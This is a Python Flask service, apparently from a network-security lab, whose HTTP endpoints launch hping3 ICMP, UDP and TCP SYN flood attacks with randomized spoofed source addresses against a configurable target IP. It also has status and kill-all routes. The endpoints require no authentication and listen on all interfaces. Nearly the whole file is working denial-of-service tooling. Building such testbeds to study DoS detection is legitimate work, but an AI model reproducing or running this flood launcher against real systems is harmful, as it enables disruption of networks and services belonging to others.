#!/usr/bin/env python3
"""
attack_controller.py

Flask controller for starting attacks (hping3) on AttackVM.

Changes:
- Provides /attack/icmp/start, /attack/udp/start, /attack/tcp/start
- Provides /attack/status
- Provides /attack/kill_all which force-kills all hping3 processes via pkill -9 -f
- Keeps placement under backend/ as in your repo

Run:
sudo python3 attack_controller.py
"""
from flask import Flask, jsonify
import subprocess
import time
import logging
import os
import signal

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

TARGET_IP = os.environ.get("TARGET_IP", "192.168.18.20")
HPING_COUNT = int(os.environ.get("HPING_COUNT", "5"))
HPING_BINARY = os.environ.get("HPING_BINARY", "hping3")

# best-effort tracking
started_processes = {"icmp": [], "udp": [], "tcp": []}

def run_cmd(cmd):
    try:
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        return proc.returncode, proc.stdout.decode(errors="ignore"), proc.stderr.decode(errors="ignore")
    except Exception as e:
        logging.exception("run_cmd failed: %s", e)
        return 1, "", str(e)

def spawn_hping(cmd_args, count=1):
    pids = []
    for _ in range(count):
        try:
            full_cmd = ["sudo", HPING_BINARY] + cmd_args
            p = subprocess.Popen(full_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            pids.append(p.pid)
            logging.info("spawned pid=%s cmd=%s", p.pid, " ".join(full_cmd))
            time.sleep(0.05)
        except Exception as e:
            logging.exception("spawn failed: %s", e)
    return pids

@app.route("/attack/icmp/start")
def start_icmp():
    try:
        args = ["--icmp", "--flood", "--rand-source", TARGET_IP]
        pids = spawn_hping(args, HPING_COUNT)
        started_processes["icmp"].extend(pids)
        return jsonify({"status":"success","message":f"Started ICMP flood ({len(pids)} processes)","pids":pids})
    except Exception as e:
        logging.exception("start_icmp error: %s", e)
        return jsonify({"status":"error","message":str(e)}),500

@app.route("/attack/udp/start")
def start_udp():
    try:
        args = ["--udp", "--flood", "--rand-source", "-p", "5201", TARGET_IP]
        pids = spawn_hping(args, HPING_COUNT)
        started_processes["udp"].extend(pids)
        return jsonify({"status":"success","message":f"Started UDP flood ({len(pids)} processes)","pids":pids})
    except Exception as e:
        logging.exception("start_udp error: %s", e)
        return jsonify({"status":"error","message":str(e)}),500

@app.route("/attack/tcp/start")
def start_tcp():
    try:
        args = ["-S", "--flood", "--rand-source", "-p", "5201", TARGET_IP]
        pids = spawn_hping(args, HPING_COUNT)
        started_processes["tcp"].extend(pids)
        return jsonify({"status":"success","message":f"Started TCP SYN flood ({len(pids)} processes)","pids":pids})
    except Exception as e:
        logging.exception("start_tcp error: %s", e)
        return jsonify({"status":"error","message":str(e)}),500

@app.route("/attack/status")
def status():
    try:
        rc, out, err = run_cmd(["pgrep", "-af", HPING_BINARY])
        processes = []
        if rc == 0 and out.strip():
            for line in out.strip().splitlines():
                parts = line.strip().split(" ",1)
                if len(parts)==2:
                    processes.append({"pid":int(parts[0]), "cmd":parts[1]})
        return jsonify({"status":"ok","running":len(processes),"processes":processes,"tracked":started_processes})
    except Exception as e:
        logging.exception("status error: %s", e)
        return jsonify({"status":"error","message":str(e)}),500

@app.route("/attack/kill_all")
def kill_all():
    """
    Force-kill all hping3 processes without restarting VM.
    Uses pkill -9 -f to be reliable on Debian/Ubuntu.
    """
    try:
        # try gentle termination of tracked PIDs
        try:
            for arr in started_processes.values():
                for pid in list(arr):
                    try:
                        os.kill(pid, signal.SIGTERM)
                    except Exception:
                        pass
            time.sleep(0.5)
        except Exception:
            pass

        rc, out, err = run_cmd(["sudo","pkill","-9","-f",HPING_BINARY])
        # clear tracking
        for k in started_processes:
            started_processes[k] = []

        rc2, out2, err2 = run_cmd(["pgrep","-af",HPING_BINARY])
        remaining = []
        if rc2==0 and out2.strip():
            for line in out2.strip().splitlines():
                p = line.strip().split(" ",1)
                if len(p)==2:
                    remaining.append({"pid":int(p[0]),"cmd":p[1]})
        return jsonify({"status":"success","message":"kill_all executed","remaining":remaining})
    except Exception as e:
        logging.exception("kill_all error: %s", e)
        return jsonify({"status":"error","message":str(e)}),500

if __name__ == "__main__":
    logging.info("Starting attack_controller on port 5002 target=%s", TARGET_IP)
    app.run(host="0.0.0.0", port=5002)
